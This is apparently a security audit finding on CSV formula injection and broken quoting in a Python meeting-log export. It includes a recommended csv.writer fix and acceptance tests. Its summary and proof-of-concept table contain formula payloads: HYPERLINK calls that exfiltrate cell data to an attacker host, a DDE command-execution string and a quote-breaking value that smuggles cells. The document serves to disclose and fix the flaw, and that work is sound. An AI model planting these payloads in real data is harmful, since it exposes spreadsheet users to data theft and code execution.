# [High] CSV formula injection and broken CSV quoting in meeting-log export

**Severity:** 🟠 High
**CVSS v3.1 (estimated):** 7.3 — AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N
**CWEs:** CWE-1236 (Improper Neutralization of Formula Elements in a CSV File), CWE-74 (Improper Neutralization of Special Elements in Output)
**OWASP:** A03:2021 Injection, ASVS V5.3.10

## Summary

`backend/app/services.py:_format_csv_row` (~line 1036) builds each CSV row via f-string concatenation:

```python
return (
    f"{entry.meeting_date},{entry.format_type},"
    f'"{speaker}","{topic_name}","{book_section}",{cancelled},{dana}'
)
```

Two defects compound:

1. **Formula injection (CWE-1236).** When a cell value begins with `=`, `+`, `-`, `@`, or a tab/CR, Excel / LibreOffice / Google Sheets interprets the cell as a formula. `speaker_name`, `topic_name`, and `group.name` all flow in unvalidated. An attacker in a group can set `speaker_name` to `=HYPERLINK("https://attacker.tld/?s="&A1,"click")` or historically worse (`=cmd|' /c calc'!A0` under DDE) and the secretary who opens the CSV triggers a credential-stealing link or, in unpatched spreadsheet software, arbitrary code execution.
2. **Broken quoting (RFC 4180).** The code wraps fields in `"..."` but does not double internal quotes. A `speaker_name` containing `"` breaks the CSV structure, shifts column boundaries, and can smuggle a new record into the export. Combined with (1) this allows arbitrary formula placement.

The exported CSV is authenticated (only a group member can fetch it), but the *reader* — the secretary in their own spreadsheet software — is the victim. Because the attacker and the reader are both group members, and the group is invitable ([#11](./11-medium-invite-code-abuse.md)), the path is realistic.

## Proof-of-concept payloads

| Field | Value |
|-------|-------|
| `speaker_name` | `=HYPERLINK("https://attacker.tld/?t="&CELL("contents",B1),"Schedule")` |
| `group.name` (→ printable export title; also dumps into CSV if later added to the header) | `",=HYPERLINK(...)` |
| `Topic.name` | `@SUM(A1:A2)` |
| `speaker_name` (quote-escape break) | `Mallory","=2+2","",,` |

## Where

- `backend/app/services.py:_format_csv_row` (~1036–1053)
- `backend/app/services.py:generate_csv_export` (~1056–1067)
- `backend/app/routers/export.py:17-30`

## Recommended fix

Use Python's `csv` module with `csv.writer(..., quoting=csv.QUOTE_ALL)` — it handles RFC-4180 escaping — **and** prefix a neutralising character to any value that starts with a formula indicator.

```python
import csv
import io

_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r", "\n")

def _neutralise(value: str | None) -> str:
    if value is None:
        return ""
    if value.startswith(_FORMULA_PREFIXES):
        return "'" + value   # single-quote prefix neutralises formula parsing
    return value


def generate_csv_export(
    db: Session,
    group: Group,
    start_date: date | None = None,
    end_date: date | None = None,
) -> str:
    entries = _query_meeting_log(db, group, start_date, end_date)
    buf = io.StringIO()
    writer = csv.writer(buf, quoting=csv.QUOTE_ALL, lineterminator="\n")
    writer.writerow(["date", "format", "speaker", "topic", "book_section", "cancelled", "dana"])
    for entry in entries:
        topic_name = ""
        if entry.topic_id:
            topic = db.query(Topic).filter(Topic.id == entry.topic_id).first()
            topic_name = topic.name if topic else ""
        book_section = ""
        if entry.format_type == "Book Study" and not entry.is_cancelled:
            book_section = _get_book_chapter_summary(db, group, entry.meeting_date) or ""
        writer.writerow([
            entry.meeting_date.isoformat(),
            entry.format_type,
            _neutralise(entry.speaker_name),
            _neutralise(topic_name),
            _neutralise(book_section),
            "Yes" if entry.is_cancelled else "",
            f"{entry.dana_amount:.2f}" if entry.dana_amount is not None else "",
        ])
    return buf.getvalue()
```

### Additional hardening

- Set `Content-Type: text/csv; charset=utf-8` and `Content-Disposition: attachment; filename="meeting_log.csv"` (the attachment disposition is already there — good).
- Serve with `X-Content-Type-Options: nosniff` so the CSV is never interpreted as HTML (part of [#07](./07-high-missing-security-headers.md)).
- Add a UTF-8 BOM (`\ufeff`) at the start of the CSV — helps Excel parse Unicode correctly **and** means a leading attacker-controlled `=` is no longer the first byte of the cell.
- Apply the same neutralisation to the header-row name columns if any user-controlled fields ever end up there.

## Acceptance criteria

- [ ] CSV output for a speaker named `=1+1` is quoted as `"'=1+1"` (leading apostrophe + surrounding quotes) and does not execute as a formula in Excel/Google Sheets (manually verify).
- [ ] CSV output for a topic named `a","b` produces a single cell containing the exact text, not a new column/row boundary.
- [ ] Tests (`pytest`) in `backend/tests/` include property-based cases (hypothesis) over arbitrary Unicode strings asserting round-trip correctness and absence of formula-leading characters without neutralisation prefix.
- [ ] CSV response sets `X-Content-Type-Options: nosniff`.

## References

- OWASP CSV Injection: https://owasp.org/www-community/attacks/CSV_Injection
- CWE-1236: https://cwe.mitre.org/data/definitions/1236.html
- Historical DDE CVEs (CVE-2014-3524 etc.) — why apparently-benign CSVs need hardening.
